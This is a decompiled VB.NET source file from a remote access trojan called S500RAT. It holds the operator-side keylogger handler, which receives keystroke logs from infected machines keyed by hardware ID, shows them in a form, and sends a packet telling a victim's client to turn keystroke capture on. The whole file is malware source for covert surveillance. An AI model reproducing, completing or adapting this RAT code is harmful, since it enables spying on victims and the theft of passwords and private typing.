Imports System
Imports System.Threading
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000051 RID: 81
	Public Class FrmKeylogger
		' Token: 0x06001197 RID: 4503 RVA: 0x0009A828 File Offset: 0x00098A28
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formKeylogger As FormKeylogger = CType(Application.OpenForms("FormKeylogger" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()), FormKeylogger)
				Dim flag As Boolean = formKeylogger IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formKeylogger.Client Is Nothing
					If flag2 Then
						formKeylogger.Client = client
						formKeylogger.Timer1.Enabled = True
						formKeylogger.KeyloggerSave.Enabled = True
					End If
					formKeylogger.Sb.Append(unpack_msgpack.ForcePathObject("Log").GetAsString())
					formKeylogger.T1.Text = formKeylogger.Sb.ToString()
					formKeylogger.T1.SelectionStart = formKeylogger.T1.TextLength
					formKeylogger.T1.ScrollToCaret()
				Else
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "keyLogger"
					msgPack.ForcePathObject("isON").AsString = "isON"
					ThreadPool.QueueUserWorkItem(AddressOf client.SendByte, msgPack.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
